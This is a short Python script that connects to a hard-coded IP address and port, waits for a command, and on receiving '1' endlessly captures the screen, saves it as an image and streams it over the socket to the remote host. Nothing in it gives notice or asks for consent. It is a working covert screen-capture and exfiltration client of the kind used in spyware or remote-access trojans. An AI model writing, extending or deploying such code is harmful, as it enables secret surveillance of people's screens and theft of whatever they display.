import os
from socket import *
from PIL import ImageGrab

s = socket()
s.connect(('172.21.187.251', 1101))

choice = s.recv(1024).decode()

if choice == '1':
    while True:
        image = ImageGrab.grab()
        image = image.resize((960,540))
        image.save('monitor.png')


        size = os.path.getsize('monitor.png')
        s.send(str(size).encode())
        s.recv(1024)

        with open('monitor.png', 'rb') as f:
            for line in f:
                s.send(line)